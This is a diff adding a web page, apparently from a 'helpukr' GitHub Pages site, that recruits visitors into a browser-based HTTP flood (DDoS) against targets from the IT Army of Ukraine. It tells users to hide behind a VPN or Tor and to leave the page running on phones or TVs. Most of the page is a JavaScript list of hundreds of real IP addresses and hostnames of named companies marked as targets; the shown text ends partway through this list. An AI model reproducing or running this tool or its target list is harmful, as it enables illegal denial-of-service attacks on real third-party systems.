@@ -1,0 +1,1468 @@
+<!doctype html><head>
+  <html lang="en">
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=1024">
+  <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+  <title>Day 695 flood</title>
+  <link href="https://www.helpukr.xyz/bootstrap.helpukr.css" rel="stylesheet" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.min.css">
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.min.js" crossorigin="anonymous"></script>
+  <script src= "https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+<script type="text/javascript">
+function MM_swapImgRestore() { //v3.0
+  var i,x,a=document.MM_sr; for(i=0;a&&i<a.length&&(x=a[i])&&x.oSrc;i++) x.src=x.oSrc;
+}
+function MM_preloadImages() { //v3.0
+  var d=document; if(d.images){ if(!d.MM_p) d.MM_p=new Array();
+    var i,j=d.MM_p.length,a=MM_preloadImages.arguments; for(i=0; i<a.length; i++)
+    if (a[i].indexOf("#")!=0){ d.MM_p[j]=new Image; d.MM_p[j++].src=a[i];}}
+}
+
+function MM_findObj(n, d) { //v4.01
+  var p,i,x;  if(!d) d=document; if((p=n.indexOf("?"))>0&&parent.frames.length) {
+    d=parent.frames[n.substring(p+1)].document; n=n.substring(0,p);}
+  if(!(x=d[n])&&d.all) x=d.all[n]; for (i=0;!x&&i<d.forms.length;i++) x=d.forms[i][n];
+  for(i=0;!x&&d.layers&&i<d.layers.length;i++) x=MM_findObj(n,d.layers[i].document);
+  if(!x && d.getElementById) x=d.getElementById(n); return x;
+}
+
+function MM_swapImage() { //v3.0
+  var i,j=0,x,a=MM_swapImage.arguments; document.MM_sr=new Array; for(i=0;i<(a.length-2);i+=3)
+   if ((x=MM_findObj(a[i]))!=null){document.MM_sr[j++]=x; if(!x.oSrc) x.oSrc=x.src; x.src=a[i+2];}
+}
+</script>
+</head>
+  
+  
+  
+<style>
+  /* width */
+  ::-webkit-scrollbar {
+    width: 10px;
+    overflow: auto;
+    height: 0em;
+  }
+  /* Track */
+  ::-webkit-scrollbar-track {
+    background: #34a8eb;
+  }
+  /* Handle */
+  ::-webkit-scrollbar-thumb {
+    background: #63c6ff
+    ;
+  }
+  /* Handle on hover */
+  ::-webkit-scrollbar-thumb:hover {
+    background: yellow;
+  }
+  .style10 {
+    font-size: 9px;
+    color: #FFFFFF;
+  }
+  </style>
+    <script> 
+      /* This method uses ipify's api to get the clients IP Address. 
+      This method is completely free and no limitations of use. */ 
+      $.getJSON("https://api.ipify.org?format=json", 
+                      function(data) { 
+        // userip element is where the IP will be displayed
+        $("#userip").html(data.ip); 
+      }) 
+    </script>
+    <style> 
+      h6 {
+      color:white;
+      }
+    </style>
+      <style>
+          body {
+              padding: 0;
+              margin: 0;
+              font-family: Arial, sans-serif;
+              background-color: #FFD600;
+          }
+          .title {
+              margin: 3rem auto 3rem auto;
+              text-align: center;
+              color: #005BBC;
+          }
+          .intro .howto {
+              background-color: #005BBC;
+          }
+          .intro .howto h3 {
+              color: #FFD600;
+              text-align: center;
+              margin-top: 1rem;
+          }
+          .intro .howto p {
+              color: white;
+              text-align: justify;
+          }
+  
+          .footer {
+      color: #005BBC;
+      margin-top: 2rem;
+      text-align: center;
+          }
+          .desc{
+              color:black;
+              padding-top: 2rem;
+              padding-bottom: 2rem;
+              margin: 0 auto;
+              width: 60%;
+          }
+          .desc h3 {
+              text-align: center;
+              color: #005BBC;
+          }
+          #stats h4 {
+              font-size: 1.1em;
+              text-decoration: underline;
+              color: #005BBC;
+              font-weight: 400;
+          }
+          table.status {
+              margin-bottom: 10px;
+          }
+      .style1 {
+    color: #CC0000;
+    font-weight: bold;
+  }
+  .style6 {color: #FF6262}
+      .style7 {font-size: 0.1px}
+      .style9 {
+    color: #FFD600;
+    font-weight: bold;
+    font-size: 18px;
+  }
+      .style10 {font-size: 24px}
+      .style11 {
+    font-size: 16px;
+    color: #FFFFFF;
+  } 
+      .style13 {
+    margin: 3rem auto 3rem auto;
+    text-align: center;
+    color: #FFD600;
+    font-size: 24px;
+    font-weight: bold;
+  }
+      .style14 {color: #FFFFFF}
+      .style15 {color: #FFFF00}
+      .style16 {color: #FF3300}
+      .style17 {color: #FF6633}
+      .style17 {color: #FF6633}
+  .style21 {color: #B9DCFF}
+      .style22 {color: #ECE3AA}
+    table {
+    border-color: #fffd9c;
+  }
+  </style>
+  <body onLoad="MM_preloadImages('https://i.imgur.com/3E2WIia.png')">
+      <div class="modal" id="HelpUKR-WarningBox" tabindex="-1" role="dialog" aria-labelledby="HelpUKR-WarningBoxLabel" aria-hidden="true" data-bs-backdrop="static" data-bs-keyboard="false">
+      <div class="modal-dialog modal-dialog-centered" role="document">
+      <div class="modal-content">
+      <div class="modal-header" style=" padding-bottom: 4px; padding-top: 3px;padding-left: 3px;">
+      <h5 id="HelpUKR-WarningBoxLabel" style=" margin-bottom: 0px;">
+    <span class="modal-title style1"><img class="qIBnUc" src="https://i.imgur.com/kpcdmzu.png" draggable="false" width="50px" alt="UKR"> Warning: </span><span class="modal-title style6">Read before you continue.&nbsp;<span class="style16"><i>[</span><span class="style17"><b>Day 695</span></b><span class="style16">]</i></span></span></h5></div>
+      <div class="modal-body" style=" padding-top: 5px; padding-bottom: 0px;">
+      <p style=" margin-bottom: 0px;">As you’ll already be aware, DDoSin or participating in any kind of cyber-attack in general is illegal, and usually for good reason.</p>
+  <hr style=" margin-top: 3px; margin-bottom: 3px;">
+      <p style=" margin-bottom: 0px;">Click "Continue" if you have a VPN, Proxy, the Tor browser or your own secure connection &amp; wish to support Ukraine in taking down Russian propaganda and services aiding Putins invasion</p>
+  <hr style=" margin-top: 3px; margin-bottom: 3px;">
+      This works by sending GET requests to each targeted website. It’s like opening each website in a random sequence on your PC and re-requesting the data over and over, although the data is not saved or cached, Due to the way it work, It should be fair to say that your Internet service Provider (ISP) won’t be any more bothered about this than they would you browsing the internet, but its always best to stay safe when it comes to security.                                                                                                                                                                                                                                                           
+  <hr style=" margin-top: 3px; margin-bottom: 3px;">
+      
+     <p style="
+    margin-bottom: 0px;
+"><span style="font-size:14px;"><u></u><strong>Todays message from the IT Army of Ukraine: </strong></span><br>
+		<a href="https://lieber.westpoint.edu/recapping-cyber-war-lessons-russia-ukraine-conflict/">
+		<table width="100%" border="0">
+		  <tbody>
+		    <tr></tr>
+	      </tbody>
+	    </table>
+		
+		<table width="100%" border="0">
+		  <tbody>
+		    <tr></tr>
+	      </tbody>
+	    </table>
+		</a>
+		<table width="100%" border="0">
+		  <tbody>
+		  <tr>There are still many rumors surrounding how the IT ARMY works. Many of them come from the Western press, which uses data that are mostly analysts' speculations rather than facts. However, lately, the situation has been improving, and the latest material by David Kirichenko for Euromaidan Press deserves special attention due to the accuracy and quality of the collected data about our community. We recommend reading it!</tr>
+	      </tbody>
+	    </table>
+<table width="100%" border="0">
+		  </table>
+	</a><span style="font-size:14px;"><u></u><strong>Additional message for newly added targets:&nbsp;&nbsp;<br></strong>
+    &nbsp; &nbsp; &nbsp; To keep up with targets we're going to use the db1000n targets<br>
+    &nbsp; &nbsp; &nbsp; direct from their GitHub repository.<br>
+    &nbsp; &nbsp; &nbsp; These updates will be daily, so if the db1000n changes, it will<br>
+    &nbsp; &nbsp; &nbsp; probably take a few hours longer for the change to make it here.
+      </div>
+      <div class="modal-footer">
+      <button type="button" class="btn btn-secondary" onClick="window.location.href='https://www.helpukr.xyz'">Leave</button>
+      <button type="button" class="btn btn-primary" data-dismiss="HelpUKR-WarningBoxLabel" onClick="togglePause(); myModal.toggle();">Continue</button></div></div></div></div><table width="100%" border="0" align="center" bgcolor="#005BBC">
+        <tr>
+          <td bgcolor="#004A9D"><div align="center">
+            <table width="200" border="1" style="border-top-width: 0px;">
+                <tbody><tr>
+                  <td><table width="989" border="1" align="left" style="border-top-width: 0px;border-bottom-width: 0px;border-left-width: 0px;border-right-width: 0px;">
+                    <tbody>
+                      <tr>
+                        <td width="239" bgcolor="#005BB7"><div align="right"><span class="style14"><strong> Info:</strong> Your Public IP Address is: </span></div></td>
+                        <td width="175" bgcolor="#005BB7"><h6 id="userip" style="margin-bottom: 0px;">Loading..</h6></td>
+                        <td width="553" bgcolor="#005BB7"><div align="right"><span class="style21">For privacy, download the Tor Browser:</span> <a href="https://www.torproject.org/download/" target="_blank" class="style22" rel="nofollow">https://www.torproject.org/download/</a> &nbsp; </div></td>
+                      </tr>
+                    </tbody>
+                  </table></td>
+                </tr>
+              </tbody></table>
+            <p class="style13" style="margin-top: 0px;margin-bottom: 0px;">Propaganda http(s) flood for <span class="style15">Day 695 </span>using targets from the IT Army of Ukraine.</p>
+          </div></td>
+        </tr><tr>
+          <td bgcolor="#0057B7"><div align="center" class="style9 style10">
+            <h3><u>Information about this tool.</u></h3>
+          </div></td>
+        </tr><tr>
+          <td><table width="90%" border="0" align="center">
+            <tr>
+              <td align="center"><p class="style11">This tool is hosted via <a href="https://pages.github.com/" target="_blank" class="align-content-sm-between">GitHub Page</a>, You can download it for local use and customization <a href="https://raw.githubusercontent.com/helpukr/helpukr.github.io/main/day695.htm" target="_blank" class="style15">here</a>. A new page will be added for each day, with a new set of targets from the Ukrainian IT Army's telegram servers.</p>
+                <p class="style11">All of the news in the Russian federation is fake and need to be shut down, we need as many people as possible to help. Just a tiny 1kbps of data could be the edge needed to take down a server hosting propaganda.<br>
+                  <br>Just open this page and leave it running on your devices as long as possible, it will flood targets selected specifically for that day.<br>
+                  Targets are chosen by an intelligence team who are always looking at what services are aiding Russia’s war,together we can pose a huge load on their infrastructure.</p>
+            <details>
+          <summary><span style="color: #ffff99;">Click Here for <b>FAQ</b> <i>(Questions & Answers)</i></span></summary>
+                <p><table width="100%" border="0">
+                  <tbody><tr>   
+                    <td><hr style=" margin-top: 5px; margin-bottom: 5px; color: #FFFFFF"><p class="style11">FAQ:<br>
+                      <span style="color: #ffff99;"><strong>Q)</strong></span> How can I use this in the tor browser if HTTPS overrides HTTP no matter what i try?<br>
+                      <span style="color: #ffff99;"><strong>A)</strong></span> <em>Download the page for local use, it won't use any http/https protocols because those are used to request files from a web server, but using it locally (directly from your computer) bypasses the need and allows you to flood both HTTP and HTTPS from your TOR Browser's IP.</em></p>
+                      <p class="style11"><span style="color: #ffff99;"><strong>Q)</strong></span> How can I see what's happening in more detail?<br>
+                      <span style="color: #ffff99;"><strong>A)</strong></span> Redacted for security.</p>
+                      <p class="style11"><span style="color: #ffff99;"><strong>Q)</strong></span> After so much time has passed, my browser/computer become very laggy and unresponsive or my browser crashes, how can I fix this?<br>
+                      <span style="color: #ffff99;"><strong>A)</strong></span> Redacted for security.</p>
+                      <p class="style11"><span style="color: #ffff99;"><strong>Q)</strong></span> Why are some of the requests having the same number error after a while?<br>
+                        <span style="color: #ffff99;"><strong>A)</strong></span> This is likely caused by the IP of the VPN you're using has been blocked on their side, but it could also mean the site's just totally overloaded and cannot respond to any requests.<br>Also if you’re are using https:// in the address bar that would cause the http:// addresses to do the same</p></td>
+                      </tr>
+                  </tbody>
+              </table></p>
+            </details>
+              <hr style=" margin-top: 5px; margin-bottom: 5px; color: #FFFFFF"></td>
+            </tr>
+          </table>
+            <table width="613" border="0" align="center">
+              <tr>
+                <td width="608" height="155"><h3 align="center" class="style14">Session Status</h3>
+                  <p align="center" class="style14" style="margin-bottom: 0px;padding-bottom: 0px;">Below is a log of sites that ether responded with errors or failed to respond at all.<br>
+                    It’s normal for this number to count up slow or fast and can often change.<br>
+                    If a lot of services are overloaded the numbers will go fast, else they’ll go slower.<br>
+                    If all requests are the same as all errors on some sites, it most likely means that the<br>
+                    site operator has banned the IP you’re using.<br>
+                  </p></td>
+              </tr>
+            </table>
+        </td>
+        </tr>
+      </table>
+  <div class="desc text-center" style=" padding-top: 4px;">
+    <p align="center" class="style7" style=" margin-bottom: 0px;">Total number of requests: <span id="totalrequests">0</span></p>
+    <p>So far <span id="totalerrors"><em>zero</em></span> sites have responded with errors</p>
+  <button type="button" class="btn btn-primary" onClick="togglePause();" style=" padding-left: 32px; padding-right: 32px; padding-top: 8px; padding-bottom: 8px;">Resume</button></div>
+  <div id="stats" class="container">
+    <div class="row">
+    </div>
+  </div>
+  <p class="footer">This website is an easy to run solution to flooding Russian propaganda via any internet capable device with a browser.<br>
+        For example you can walk around town shopping and flood Russian propaganda from a phone in your pocket.<br>
+        It can even be used via the browser app on a Smart TV in the background whilst you watch TV.<br>
+        With your help you can convince a Russian to rebel agents the war by making them<br>
+        look elsewhere for news, remember, Nothing you do is too little!<br>
+        Glory to Ukraine, Glory to the hero’s.<br><br>
+      <center>
+        <div id="betabox" style="text-align: center"><span class="footer"><strong><span style="color:#003697"><em><u>Estimate</u>:</em></span></strong> data requested from servers via GET: <span class="number-counter" data-count-from="0" data-count-to="1000000000000" data-count-speed="0.03">0</span>MB (MegaBytes)</span></div></center>
+  <style>#betabox {
+    padding: 1px ;
+    border-top: 1px solid #3498db;
+    border-right: 1px solid #3498db;
+    background-color: #FFE248;
+    line-height: 110%;
+    border-left: 1px solid #3498db;
+    align-content: center;
+    align-self: 4px ;
+    width: 570px ;
+  }</style>
+  <script>
+          // target list
+          var urls = [
+          //Targets from DB1000n Github Update
+		    'http://185.58.222.177',
+		    'http://185.58.223.176',
+		    'http://185.236.208.3',
+		    'http://93.90.220.130',
+		    'http://92.246.148.210',
+		    'http://93.90.223.185',
+		    'http://92.246.148.249',
+		    'http://185.236.209.34',
+		    'http://185.58.221.73',
+		    'http://stage.cbi.cloudmaster.ru',
+		    'http://185.236.209.166',
+		    'http://195.19.176.197',
+		    'http://195.19.176.204',
+		    'http://185.58.220.16',
+		    'http://dialin.slcloud.ru',
+		    'http://185.236.211.233',
+		    'http://92.246.148.193',
+		    'http://92.246.149.224',
+		    'http://93.90.220.121',
+		    'http://185.236.209.198',
+		    'http://92.246.149.19',
+		    'http://92.246.151.76',
+		    'http://92.246.151.226',
+		    'http://92.246.149.26',
+		    'http://185.236.211.6',
+		    'http://195.19.176.122',
+		    'http://185.58.223.228',
+		    'http://185.58.221.57',
+		    'http://92.246.149.239',
+		    'http://195.19.176.224',
+		    'http://93.90.220.25',
+		    'http://185.236.211.227',
+		    'http://92.246.150.219',
+		    'http://93.90.220.193',
+		    'http://195.19.176.61',
+		    'http://195.19.176.145',
+		    'http://195.19.176.37',
+		    'http://92.246.148.89',
+		    'http://vo1-r701.slcloud.ru',
+		    'http://93.90.223.171',
+		    'http://93.90.222.165',
+		    'http://93.90.220.132',
+		    'http://195.19.176.56',
+		    'http://edusam.softline.com',
+		    'http://m3vcd.slcloud.ru',
+		    'http://vo-r7-002.slcloud.ru',
+		    'http://185.236.209.77',
+		    'http://93.90.221.218',
+		    'http://185.236.208.17',
+		    'http://92.246.151.73',
+		    'http://92.246.149.249',
+		    'http://93.90.220.237',
+		    'http://helmet.softline.com',
+		    'http://195.19.176.121',
+		    'http://93.90.221.14',
+		    'http://93.90.222.5',
+		    'http://92.246.149.242',
+		    'http://185.58.221.133',
+		    'http://185.58.221.91',
+		    'http://92.246.149.110',
+		    'http://92.246.148.9',
+		    'http://195.19.176.227',
+		    'http://185.236.209.45',
+		    'http://185.58.222.101',
+		    'http://93.90.221.29',
+		    'http://195.19.178.40',
+		    'http://185.236.208.210',
+		    'http://195.19.178.41',
+		    'http://185.236.211.232',
+		    'http://185.58.222.197',
+		    'http://185.236.211.5',
+		    'http://185.236.208.212',
+		    'http://93.90.223.219',
+		    'http://185.58.223.230',
+		    'http://195.19.176.188',
+		    'http://185.58.221.201',
+		    'http://195.19.176.150',
+		    'http://93.90.223.220',
+		    'http://marketing.softline.com',
+		    'http://smetaru.slcloud.ru',
+		    'http://185.236.209.241',
+		    'http://185.58.220.56',
+		    'http://92.246.149.85',
+		    'http://92.246.150.146',
+		    'http://92.246.151.122',
+		    'http://185.58.220.11',
+		    'http://92.246.148.244',
+		    'http://vo10-ksmg.slcloud.ru',
+		    'http://185.236.208.187',
+		    'http://185.58.220.161',
+		    'http://93.90.223.210',
+		    'http://93.90.220.125',
+		    'http://93.90.220.61',
+		    'http://92.246.149.183',
+		    'http://185.58.221.75',
+		    'http://93.90.222.140',
+		    'http://185.58.222.234',
+		    'http://vo10wacweb-ext.office365russia.ru',
+		    'http://92.246.148.251',
+		    'http://92.246.149.82',
+		    'http://195.19.176.117',
+		    'http://93.90.220.54',
+		    'http://92.246.149.84',
+		    'http://185.58.223.160',
+		    'http://185.58.220.9',
+		    'http://185.236.211.228',
+		    'http://geosteering-wafn01.slcloud.ru',
+		    'http://195.19.176.50',
+		    'http://93.90.220.111',
+		    'http://93.90.222.226',
+		    'http://93.90.220.103',
+		    'http://185.58.222.204',
+		    'http://93.90.221.10',
+		    'http://92.246.149.198',
+		    'http://185.236.209.46',
+		    'http://93.90.221.216',
+		    'http://93.90.220.128',
+		    'http://93.90.222.166',
+		    'http://185.58.223.224',
+		    'http://uc.slcloud.ru',
+		    'http://93.90.221.219',
+		    'http://portfolio.softline.com',
+		    'http://185.58.221.149',
+		    'http://93.90.222.160',
+		    'http://185.236.209.211',
+		    'http://92.246.151.33',
+		    'http://195.19.178.13',
+		    'http://92.246.149.219',
+		    'http://crm.softline.ru',
+		    'http://185.58.222.83',
+		    'http://93.90.223.172',
+		    'http://185.58.222.209',
+		    'http://195.19.176.155',
+		    'http://185.58.221.74',
+		    'http://185.58.221.229',
+		    'http://92.246.149.106',
+		    'http://servicedesk.softlinegroup.com',
+		    'http://92.246.151.201',
+		    'http://185.58.223.173',
+		    'http://92.246.150.169',
+		    'http://185.236.211.250',
+		    'http://npm.softline.ru',
+		    'http://185.236.209.146',
+		    'http://93.90.221.199',
+		    'http://93.90.223.242',
+		    'http://92.246.148.250',
+		    'http://92.246.148.180',
+		    'http://185.236.208.75',
+		    'http://93.90.220.119',
+		    'http://185.58.221.233',
+		    'http://93.90.220.31',
+		    'http://185.58.221.135',
+		    'http://93.90.221.37',
+		    'http://92.246.149.141',
+		    'http://93.90.223.211',
+		    'http://93.90.220.187',
+		    'http://185.58.222.73',
+		    'http://185.236.209.139',
+		    'http://93.90.222.70',
+		    'http://ex-septemcapital-ru-3.office365russia.ru',
+		    'http://195.19.176.226',
+		    'http://185.236.209.197',
+		    'http://195.19.176.206',
+		    'http://93.90.222.115',
+		    'http://93.90.223.170',
+		    'http://185.58.222.202',
+		    'http://195.19.176.126',
+		    'http://185.58.221.76',
+		    'http://92.246.150.223',
+		    'http://92.246.150.143',
+		    'http://92.246.150.173',
+		    'http://195.19.176.237',
+		    'http://195.19.176.170',
+		    'http://185.236.211.4',
+		    'http://185.58.221.136',
+		    'http://voffice-10.office365russia.ru',
+		    'http://92.246.148.211',
+		    'http://195.19.176.133',
+		    'http://92.246.151.228',
+		    'http://185.58.223.97',
+		    'http://93.90.223.83',
+		    'http://93.90.220.99',
+		    'http://185.236.211.210',
+		    'http://185.58.221.202',
+		    'http://92.246.148.229',
+		    'http://185.58.223.83',
+		    'http://92.246.150.129',
+		    'http://93.90.222.66',
+		    'http://185.236.209.194',
+		    'http://93.90.223.169',
+		    'http://93.90.223.74',
+		    'http://tdr1.slcloud.ru',
+		    'http://93.90.220.48',
+		    'http://195.19.176.100',
+		    'http://93.90.220.15',
+		    'http://195.19.176.216',
+		    'http://185.58.222.82',
+		    'http://195.19.176.205',
+		    'http://195.19.178.67',
+		    'http://93.90.222.72',
+		    'http://92.246.149.217',
+		    'http://195.19.176.64',
+		    'http://185.58.222.113',
+		    'http://185.58.221.90',
+		    'http://185.58.220.170',
+		    'http://92.246.149.83',
+		    'http://93.90.223.65',
+		    'http://185.58.221.197',
+		    'http://93.90.222.1',
+		    'http://195.19.176.35',
+		    'http://93.90.223.178',
+		    'http://185.58.223.133',
+		    'http://185.58.221.180',
+		    'http://185.58.222.154',
+		    'http://93.90.220.216',
+		    'http://93.90.220.215',
+		    'http://93.90.222.154',
+		    'http://93.90.221.17',
+		    'http://185.236.208.68',
+		    'http://92.246.151.67',
+		    'http://92.246.149.196',
+		    'http://93.90.222.50',
+		    'http://93.90.222.84',
+		    'http://185.236.208.177',
+		    'http://93.90.220.149',
+		    'http://93.90.220.124',
+		    'http://multi.slcloud.ru',
+		    'http://185.58.222.187',
+		    'http://92.246.148.10',
+		    'http://185.236.210.9',
+		    'http://185.236.209.185',
+		    'http://93.90.222.147',
+		    'http://185.236.209.44',
+		    'http://93.90.220.220',
+		    'http://vo10-r701.slcloud.ru',
+		    'http://93.90.222.158',
+		    'http://185.58.223.81',
+		    'http://92.246.151.99',
+		    'http://92.246.148.241',
+		    'http://93.90.223.58',
+		    'http://vo1-as01.office365russia.ru',
+		    'http://185.58.221.185',
+		    'http://195.19.178.19',
+		    'http://92.246.148.228',
+		    'http://185.236.209.43',
+		    'http://195.19.176.62',
+		    'http://wiki.slcloud.ru',
+		    'http://185.58.221.178',
+		    'http://92.246.150.224',
+		    'http://92.246.150.168',
+		    'http://92.246.150.112',
+		    'http://185.236.208.66',
+		    'http://185.58.222.33',
+		    'http://185.236.209.193',
+		    'http://92.246.148.212',
+		    'http://93.90.220.7',
+		    'http://185.236.208.76',
+		    'http://185.58.220.42',
+		    'http://92.246.148.140',
+		    'http://185.236.208.186',
+		    'http://93.90.220.22',
+		    'http://92.246.150.141',
+		    'http://195.19.178.25',
+		    'http://195.19.176.112',
+		    'http://92.246.149.89',
+		    'http://92.246.148.243',
+		    'http://92.246.150.144',
+		    'http://92.246.149.184',
+		    'http://185.236.209.210',
+		    'http://92.246.151.34',
+		    'http://185.58.221.144',
+		    'http://92.246.149.185',
+		    'http://crm.softline.com',
+		    'http://195.19.176.235',
+		    'http://185.58.221.107',
+		    'http://185.58.223.105',
+		    'http://93.90.223.249',
+		    'http://92.246.149.229',
+		    'http://185.236.210.10',
+		    'http://92.246.150.176',
+		    'http://185.236.209.151',
+		    'http://decathlon.slcloud.ru',
+		    'http://93.90.223.89',
+		    'http://185.58.221.176',
+		    'http://185.58.220.5',
+		    'http://93.90.220.96',
+		    'http://92.246.149.27',
+		    'http://185.58.221.213',
+		    'http://185.236.209.42',
+		    'http://workflowsoft.com',
+		    'http://185.236.208.67',
+		    'http://92.246.149.163',
+		    'http://185.236.209.147',
+		    'http://195.19.176.232',
+		    'http://185.236.208.209',
+		    'http://195.19.176.219',
+		    'http://92.246.148.242',
+		    'http://92.246.148.129',
+		    'http://92.246.148.247',
+		    'http://195.19.176.11',
+		    'http://92.246.148.240',
+		    'http://185.236.209.33',
+		    'http://195.19.176.42',
+		    'http://185.236.209.180',
+		    'http://92.246.149.21',
+		    'http://185.58.221.237',
+		    'http://92.246.149.20',
+		    'http://185.58.222.74',
+		    'http://195.19.176.9',
+		    'http://185.236.208.113',
+		    'http://185.236.209.35',
+		    'http://92.246.149.17',
+		    'http://92.246.149.123',
+		    'http://93.90.221.25',
+		    'http://93.90.220.46',
+		    'http://93.90.222.82',
+		    'http://92.246.148.239',
+		    'http://tms.cloudmaster.ru',
+		    'http://93.90.220.222',
+		    'http://93.90.220.73',
+		    'http://185.236.208.50',
+		    'http://185.236.211.229',
+		    'http://92.246.150.1',
+		    'http://185.236.211.226',
+		    'http://185.236.210.27',
+		    'http://93.90.223.218',
+		    'http://195.19.176.39',
+		    'http://185.58.223.107',
+		    'http://92.246.149.114',
+		    'http://92.246.148.245',
+		    'http://mail.adecco.office365russia.ru',
+		    'http://93.90.220.190',
+		    'http://185.58.223.99',
+		    'http://93.90.220.129',
+		    'http://resourcetrans.office365russia.ru',
+		    'http://93.90.220.100',
+		    'http://185.58.221.43',
+		    'http://92.246.150.167',
+		    'http://93.90.223.73',
+		    'http://p4p.softline.com',
+		    'http://185.58.221.98',
+		    'http://185.58.223.114',
+		    'http://92.246.150.231',
+		    'http://92.246.148.248',
+		    'http://93.90.223.84',
+		    'http://185.58.221.82',
+		    'http://185.58.221.147',
+		    'http://93.90.220.209',
+		    'http://185.58.223.163',
+		    'http://92.246.150.24',
+		    'http://185.236.209.196',
+		    'http://93.90.221.2',
+		    'http://92.246.150.178',
+		    'http://185.58.223.231',
+		    'http://195.19.178.10',
+		    'http://92.246.151.97',
+		    'http://92.246.151.123',
+		    'http://d2insur.slcloud.ru',
+		    'http://195.19.178.20',
+		    'http://92.246.150.162',
+		    'http://92.246.149.22',
+		    'http://185.58.221.97',
+		    'http://185.58.223.98',
+		    'http://185.58.221.228',
+		    'http://report.softline.com',
+		    'http://92.246.149.161',
+		    'http://185.58.222.65',
+		    'http://185.236.209.195',
+		    'http://93.90.220.30',
+		    'http://185.236.208.73',
+		    'http://do.softlinegroup.com',
+		    'http://195.19.176.72',
+		    'http://185.58.222.217',
+		    'http://stynergy-wafn01.slcloud.ru',
+		    'http://195.19.176.109',
+		    'http://92.246.149.226',
+		    'http://185.58.221.232',
+		    'http://92.246.149.227',
+		    'http://195.19.176.207',
+		    'http://93.90.223.179',
+		    'http://93.90.221.32',
+		    'http://185.236.209.47',
+		    'http://185.236.209.148',
+		    'http://195.19.176.52',
+		    'http://195.19.176.152',
+		    'http://92.246.151.124',
+		    'http://92.246.150.158',
+		    'http://fsk.softline.com',
+		    'http://195.19.176.231',
+		    'http://195.19.176.91',
+		    'http://92.246.149.166',
+		    'http://veeamem.slcloud.ru',
+		    'http://92.246.148.209',
+		    'http://195.19.178.36',
+		    'http://185.58.223.202',
+		    'http://92.246.151.98',
+		    'http://92.246.149.152',
+		    'http://195.19.176.25',
+		    'http://93.90.221.204',
+		    'http://93.90.222.83',
+		    'http://rpo-mail.softline.ru',
+		    'http://195.19.176.209',
+		    'http://185.58.223.209',
+		    'http://lengazspetsstroy.slcloud.ru',
+		    'http://93.90.222.241',
+		    'http://185.58.223.193',
+		    'http://92.246.149.222',
+		    'http://185.58.221.152',
+		    'http://185.58.223.205',
+		    'http://195.19.176.14',
+		    'http://185.58.220.171',
+		    'http://93.90.222.234',
+		    'http://93.90.223.209',
+		    'http://93.90.222.138',
+		    'http://93.90.220.247',
+		    'http://185.58.220.187',
+		    'http://195.19.176.182',
+		    'http://185.58.220.55',
+		    'http://92.246.150.27',
+		    'http://185.236.210.26',
+		    'http://195.19.176.108',
+		    'http://92.246.149.117',
+		    'http://92.246.151.193',
+		    'http://185.236.211.3',
+		    'http://crmlist.softline.com',
+		    'http://185.236.209.145',
+		    'http://92.246.148.227',
+		    'http://195.19.176.208',
+		    'http://185.236.208.185',
+		    'http://185.58.221.164',
+		    'http://93.90.221.64',
+		    'http://92.246.150.130',
+		    'http://185.58.222.44',
+		    'http://195.19.176.95',
+		    'http://185.236.208.74',
+		    'http://services.softline.ru',
+		    'http://93.90.220.147',
+		    'http://185.58.222.76',
+		    'http://195.19.176.236',
+		    'http://185.58.222.134',
+		    'http://185.58.222.133',
+		    'http://92.246.148.246',
+		    'http://92.246.148.252',
+		    'http://93.90.223.212',
+		    'http://185.236.209.149',
+		    'http://185.58.222.75',
+		    'http://vo18.slcloud.ru',
+		    'http://185.58.220.218',
+		    'http://92.246.150.147',
+		    'http://92.246.149.135',
+		    'http://92.246.150.187',
+		    'http://93.90.223.180',
+		    'http://185.58.220.201',
+		    'http://185.58.223.108',
+		    'http://185.236.208.2',
+		    'http://93.90.222.106',
+		    'http://ci.cloudmaster.ru',
+		    'http://93.90.221.220',
+		    'http://93.90.223.217',
+		    'http://185.58.221.89',
+		    'http://185.58.221.231',
+		    'http://195.19.176.110',
+		    'http://195.19.176.107',
+		    'http://93.90.223.251',
+		    'http://195.19.176.214',
+		    'http://92.246.151.68',
+		    'http://185.236.208.1',
+		    'http://93.90.223.177',
+		    'http://inferit.cloudmaster.ru',
+		    'https://92.246.149.69',
+		    'https://185.58.223.224',
+		    'https://185.58.222.155',
+		    'https://93.90.223.58',
+		    'https://185.58.220.41',
+		    'https://185.58.221.181',
+		    'https://185.236.209.74',
+		    'https://185.236.208.17',
+		    'https://93.90.220.100',
+		    'https://185.58.223.145',
+		    'https://92.246.150.24',
+		    'https://195.19.176.15',
+		    'https://vo12-ksmg.slcloud.ru',
+		    'https://195.19.176.35',
+		    'https://185.58.221.180',
+		    'https://185.58.222.131',
+		    'https://195.19.176.170',
+		    'https://185.58.221.147',
+		    'https://92.246.149.143',
+		    'https://185.236.209.197',
+		    'https://185.236.209.43',
+		    'https://ex-kzreddon-ru-1.office365russia.ru',
+		    'https://92.246.151.177',
+		    'https://92.246.151.97',
+		    'https://185.58.220.5',
+		    'https://93.90.221.199',
+		    'https://195.19.178.22',
+		    'https://92.246.149.142',
+		    'https://93.90.220.187',
+		    'https://185.236.211.226',
+		    'https://195.19.179.1',
+		    'https://92.246.149.198',
+		    'https://185.58.221.149',
+		    'https://93.90.220.56',
+		    'https://195.19.176.226',
+		    'https://185.236.208.66',
+		    'https://93.90.221.218',
+		    'https://185.58.221.81',
+		    'https://93.90.220.99',
+		    'https://185.236.210.26',
+		    'https://p4p.softline.com',
+		    'https://92.246.151.182',
+		    'https://92.246.150.162',
+		    'https://185.58.220.42',
+		    'https://resourcetrans.office365russia.ru',
+		    'https://stynergy-wafn01.slcloud.ru',
+		    'https://185.58.221.233',
+		    'https://92.246.149.139',
+		    'https://mail-ix.vedomosti.office365russia.ru',
+		    'https://93.90.220.237',
+		    'https://185.236.209.151',
+		    'https://92.246.148.209',
+		    'https://93.90.220.111',
+		    'https://185.236.209.35',
+		    'https://93.90.221.204',
+		    'https://ex-kzreddon-ru-5.office365russia.ru',
+		    'https://195.19.176.216',
+		    'https://lengazspetsstroy.slcloud.ru',
+		    'https://195.19.176.205',
+		    'https://185.236.209.33',
+		    'https://185.236.208.3',
+		    'https://195.19.178.10',
+		    'https://92.246.151.122',
+		    'https://92.246.149.226',
